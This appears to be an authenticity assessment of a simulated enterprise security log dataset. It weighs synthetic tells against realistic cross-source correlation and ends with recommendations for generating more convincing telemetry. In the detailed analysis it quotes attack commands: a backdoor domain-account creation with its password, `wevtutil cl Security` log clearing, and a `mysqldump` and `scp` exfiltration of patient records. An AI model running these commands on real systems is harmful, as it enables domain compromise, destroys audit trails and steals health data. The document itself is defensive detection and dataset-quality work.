# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Inconclusive
**Verdict Confidence:** 68
**Synthetic-Confidence Score:** 36

## Executive Summary

This dataset is highly production-like in scope, source diversity, and cross-source lifecycle coherence, so I would not call it confidently synthetic. I found a few concrete synthetic tells, mainly a same-host SSH syslog formatting inconsistency and one SSH session lifecycle gap, but they are not strong enough to outweigh the otherwise realistic enterprise telemetry.

## Evidence For Synthetic

- **[schema_or_format]** `APP-INT-01` logs most `Accepted publickey` SSH events with key type and SHA256 fingerprint, but the root scp session at `2024-03-18T17:30:47.880103Z` omits that suffix on the same host and source family.
- **[contract_gap]** `DB-PROD-01` records a root SSH login from `10.10.2.30:56230` at `2024-03-18T17:14:39.791800Z`, and Zeek records that SSH connection as `conn_state=SF` with `duration=1420.075291`, but I did not find the expected DB-side PAM close/logind removal or eCAR `USER_SESSION LOGOUT`.
- **[distribution_texture]** `DB-PROD-01` has many root-owned, `systemd`-launched `wget -q -e use_proxy=yes -O - https://.../` checks across common domains and `https://internal-service/`. This is explainable as monitoring, but the repetition feels somewhat templated for a database host.

## Evidence For Real

- The visible collection window is coherent: network, proxy, firewall, and application logs stay around `2024-03-18T12:00:00Z` to `18:00:00Z`, while endpoint/security logs have plausible post-window tail records.
- Host roles and IP space are internally consistent: DC/file/app/database/proxy/web/mail hosts sit in plausible `10.10.x.x` segments, with DHCP, Zeek, endpoint, proxy, and firewall views agreeing.
- The Windows domain-compromise chain has strong source-native companions: eCAR process/flow evidence on `DC-01` aligns with Security events `4697`, `4720`, `4724`, `4738`, `4728`, `4698`, `1102`, and `4726`.
- The Linux data-access/exfil chain is very coherent across bash history, syslog, eCAR, and Zeek: `mysqldump`, gzip, scp, inbound SSH on `APP-INT-01`, file creation under `/tmp/.cache/`, and matching Zeek SSH tuples.
- Proxy behavior is credible: denied proxy rows do not produce proxy-origin egress, while allowed requests have corresponding proxy, Zeek HTTP/SSL, and perimeter firewall evidence.
- Windows XML, Zeek JSON, proxy access, Cisco ASA, web access, and syslog records generally use plausible source-native fields, event IDs, timestamps, and lifecycle ordering.

## Detailed Analysis

The environment looks like a mid-sized enterprise slice with Windows domain infrastructure (`DC-01`, `FILE-SRV-01`, Windows workstations), Linux application/database hosts (`APP-INT-01`, `DB-PROD-01`), DMZ/web/proxy/mail assets, Zeek core/DMZ sensors, perimeter ASA, Snort, proxy, and web access logs. The primary time window is `2024-03-18 12:00:00Z` through `18:00:00Z`, with endpoint tail activity after that.

The strongest realistic chain is on `DB-PROD-01`. Syslog shows `2024-03-18T17:14:36.669637Z` SSH connection from `10.10.2.30 port 56230`, then `Accepted password for root` at `17:14:39.791800Z`, and `New session 279069 of user root` at `17:14:40.325214Z`. eCAR then records root activity: `mysql ... SHOW DATABASES`, `mysql ... SHOW TABLES FROM ehr`, `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`, gzip, and `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`. Zeek core confirms `10.10.2.30:56230 -> 10.10.4.10:22` with UID `CzouobWAdZeFURjBK`, `service=ssh`, `conn_state=SF`.

The receiving side also works. `APP-INT-01` syslog shows `2024-03-18T17:30:46.201935Z` connection from `10.10.4.10 port 46080`, accepted publickey for root at `17:30:47.880103Z`, and session close/removal around `17:31:10Z`. APP eCAR has the inbound flow, `USER_SESSION LOGIN`, and file create for `/tmp/.cache/rpt_0318.sql.gz`. Zeek core records the reverse SSH/scp tuple `10.10.4.10:46080 -> 10.10.2.30:22`, UID `CLmeBZAomqzINfcXGLy`, `duration=22.640015`, `orig_bytes=211665`, `resp_bytes=12835`.

The Windows chain is similarly coherent. `WS-AJOHNSON-01` shows domain discovery at about `15:19:48Z` to `15:19:50Z`. On `DC-01`, eCAR shows remote service behavior from `10.10.1.35`, including `C:\Windows\PSEXESVC.exe`, `net user svc_mhsync MhsSvc!2024 /add /domain`, Domain Admins membership, `DeviceSyncSvc`, a scheduled task, encoded PowerShell fetching `https://api.westbridge-services.net/v2/manifest`, `wevtutil cl Security`, and later `net user svc_mhsync /delete /domain`. Security XML has the expected companion events with realistic IDs and subjects, including `4697`, `4720`, `4728`, `4698`, `1102`, and `4726`.

The main authenticity blemish is source-native SSH formatting. On `APP-INT-01`, normal `Accepted publickey` entries include suffixes such as `ssh2: RSA SHA256:...`, `ssh2: ED25519 SHA256:...`, or `ssh2: ECDSA SHA256:...`. The root scp receive line at `2024-03-18T17:30:47.880103Z` says only `Accepted publickey for root from 10.10.4.10 port 46080 ssh2`. That same-host inconsistency is a concrete synthetic indicator, though not an impossible contradiction.

The second blemish is lifecycle closure. `DB-PROD-01` has many normal SSH `session closed` and `Removed session` pairs for other users, but the root session `279069` does not visibly close, despite Zeek showing the corresponding SSH transport closed successfully inside the window. This is explainable by selective endpoint collection loss, but the surrounding DB syslog continuity makes it count against authenticity.

## Synthetic Indicator Summary

| Category | Affected source family | Scope | Why it affected score |
|---|---|---:|---|
| `schema_or_format` | Linux syslog / sshd | Single APP root SSH event | Same host usually logs publickey key type and fingerprint; one pivotal root event omits it. |
| `contract_gap` | Linux syslog + eCAR + Zeek | One DB root SSH session | Network transport closes cleanly, but DB-side session close/logout companion is absent. |
| `distribution_texture` | Linux eCAR/process telemetry | DB background activity | Repeated root `wget` healthcheck commands are plausible but somewhat templated. |
| `weak_signal` | Collection profile | Dataset-wide | Coverage is broadly plausible; minor gaps are not enough for a synthetic verdict. |

## Realism Score by Category

- **Field format accuracy:** 86 — Strong source-native Windows, Zeek, proxy, ASA, and syslog structure, with one SSH formatting inconsistency.
- **Temporal patterns:** 82 — Ordering and windowing are plausible, with one notable SSH lifecycle closure gap.
- **Cross-source correlation:** 90 — Attack and background activity correlate well across endpoint, network, proxy, firewall, and application sources.
- **Behavioral realism:** 84 — Kill-chain steps and pivots are credible, with realistic discovery, persistence, exfiltration, cleanup, and background noise.
- **Environmental consistency:** 88 — Host roles, IP segments, collection scope, and service visibility mostly fit a coherent enterprise environment.

## Recommendations

- Normalize SSH syslog rendering per host: if `APP-INT-01` logs publickey key type and SHA256 fingerprints, include them consistently for root scp sessions too.
- For any SSH connection that Zeek marks `SF` within the visible window, emit or explicitly model the endpoint-side PAM close/logind removal and eCAR `USER_SESSION LOGOUT`.
- Add more owner/unit context around DB healthcheck-style `wget` activity, or reduce exact command repetition so it reads less like templated background generation.
- Preserve the current cross-source correlation quality; the strongest realism comes from matching endpoint, network, proxy, and security-audit evidence without forcing every source to be perfectly complete.
